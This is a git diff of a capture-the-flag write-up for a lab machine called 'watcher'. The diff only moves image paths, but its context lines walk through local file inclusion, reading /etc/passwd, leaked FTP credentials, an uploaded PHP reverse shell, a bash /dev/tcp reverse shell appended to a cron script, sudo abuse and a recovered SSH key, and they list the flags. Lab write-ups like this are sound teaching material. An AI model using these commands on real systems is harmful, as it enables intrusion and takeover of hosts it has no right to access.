@@ -23,11 +23,11 @@ sticker: emoji//1f989
 
 Let's visit the website:
 
-![](Pasted%20image%2020250326151154.png)
+![](images/Pasted%20image%2020250326151154.png)
 
 We got a simple website that has some posts, if we click on any of them, we can see this:
 
-![](Pasted%20image%2020250326151222.png)
+![](images/Pasted%20image%2020250326151222.png)
 
 We can see a url in the form of:
 
@@ -37,7 +37,7 @@ post.php?post=
 
 This may be vulnerable to LFI, due to the way the `post.php` file display the post, let's try reading `/etc/passwd`:
 
-![](Pasted%20image%2020250326151326.png)
+![](images/Pasted%20image%2020250326151326.png)
 
 No need to even do path traversal, let's submit the request to our proxy to handle this thing easily, reading `/etc/passwd` gives us this:
 
@@ -227,11 +227,11 @@ Let's start the exploitation phase.
 
 We can check that `robots.txt` file, I tried reading `/var/log/apache2/access.log` or `/var/www/html/config.php` and many other files but none of them worked, so, let's read this to check if we can find anything to read with the LFI:
 
-![](Pasted%20image%2020250326153726.png)
+![](images/Pasted%20image%2020250326153726.png)
 
 We can read the first flag:
 
-![](Pasted%20image%2020250326153827.png)
+![](images/Pasted%20image%2020250326153827.png)
 
 
 
@@ -241,7 +241,7 @@ FLAG{robots_dot_text_what_is_next}
 
 Now, within this file we found another file, if we try accessing it through the normal website, we get `403` status code, but this is where the LFI comes in:
 
-![](Pasted%20image%2020250326154000.png)
+![](images/Pasted%20image%2020250326154000.png)
 
 
 We can find this:
@@ -257,7 +257,7 @@ ftpuser:givemefiles777
 ```
 
 
-![](Pasted%20image%2020250326154109.png)
+![](images/Pasted%20image%2020250326154109.png)
 
 In this we can find `flag_2.txt` and a directory called files, let's read the flag first:
 
@@ -266,11 +266,11 @@ cat flag_2.txt
 FLAG{ftp_you_and_me}
 ```
 
-![](Pasted%20image%2020250326154317.png)
+![](images/Pasted%20image%2020250326154317.png)
 
 `files` directory is empty, but it is `writable`, this means that through the LFI we can access any file we upload to it, so, let's upload a reverse shell and access the file:
 
-![](Pasted%20image%2020250326154550.png)
+![](images/Pasted%20image%2020250326154550.png)
 
 Now, let's use the LFI to access the file, but first, we need to set up our listener, once we've done it, let's submit this:
 
@@ -280,7 +280,7 @@ post=/home/ftpuser/ftp/files/shell.php
 
 We can see the connection in our shell:
 
-![](Pasted%20image%2020250326154710.png)
+![](images/Pasted%20image%2020250326154710.png)
 
 Let's proceed with PrivEsc.
 
@@ -301,7 +301,7 @@ First thing to do is to get a stable shell:
 5. export TERM=xterm
 6. export BASH=bash
 
-![](Pasted%20image%2020250326154811.png)
+![](images/Pasted%20image%2020250326154811.png)
 
 Now, with the shell, we can start looking around, for example, we can find the third flag here:
 
@@ -312,15 +312,15 @@ FLAG{lfi_what_a_guy}
 
 Let's get linpeas and check for any way to get into other user:
 
-![](Pasted%20image%2020250326155501.png)
+![](images/Pasted%20image%2020250326155501.png)
 
 We can run any command as `toby` with user, let's switch into `toby:
 
-![](Pasted%20image%2020250326155620.png)
+![](images/Pasted%20image%2020250326155620.png)
 
 We can now read what's in `toby`'s home:
 
-![](Pasted%20image%2020250326155646.png)
+![](images/Pasted%20image%2020250326155646.png)
 
 Let's read flag 4:
 
@@ -364,7 +364,7 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 
 We got a script called `cow.sh` running at `jobs` directory on toby's home, let's check if we can modify this so we can get a shell as mat:
 
-![](Pasted%20image%2020250326155955.png)
+![](images/Pasted%20image%2020250326155955.png)
 
 We indeed can, let's modify it:
 
@@ -374,7 +374,7 @@ echo "/bin/bash -i >& /dev/tcp/IP/PORT 0>&1" >> /home/toby/jobs/cow.sh
 
 After we set up a new listener with another port, we get this:
 
-![](Pasted%20image%2020250326160120.png)
+![](images/Pasted%20image%2020250326160120.png)
 
 There we go, we got our shell as `mat`, shell is a little unstable so we can stabilize it again:
 
@@ -388,7 +388,7 @@ export TERM=xterm
 export BASH=bash
 ```
 
-![](Pasted%20image%2020250326160254.png)
+![](images/Pasted%20image%2020250326160254.png)
 
 Got the flag 5 and another note:
 
@@ -422,7 +422,7 @@ User mat may run the following commands on watcher:
 
 We can check the folder and will notice this:
 
-![](Pasted%20image%2020250326161055.png)
+![](images/Pasted%20image%2020250326161055.png)
 
 We can check both files:
 
@@ -477,7 +477,7 @@ sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1
 
 We can see this:
 
-![](Pasted%20image%2020250326162027.png)
+![](images/Pasted%20image%2020250326162027.png)
 
 We got a shell as `will`, let's work our way into root from here:
 
@@ -488,7 +488,7 @@ FLAG{but_i_thought_my_script_was_secure}
 
 No note in this point, let's use linpeas again:
 
-![](Pasted%20image%2020250326162839.png)
+![](images/Pasted%20image%2020250326162839.png)
 
 We can find something called `key.b64` if we decode the contents of it, we can see the following:
 
@@ -590,7 +590,7 @@ LUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=' | base64 -d > id-rsa; chmod 600 id_rsa
 
 Now, let's access root:
 
-![](Pasted%20image%2020250326163020.png)
+![](images/Pasted%20image%2020250326163020.png)
 
 It worked, we finally got root, let's read final flag:
 
@@ -599,5 +599,5 @@ root@watcher:~# cat flag_7.txt
 FLAG{who_watches_the_watchers}
 ```
 
-![](Pasted%20image%2020250326163056.png)
+![](images/Pasted%20image%2020250326163056.png)
 
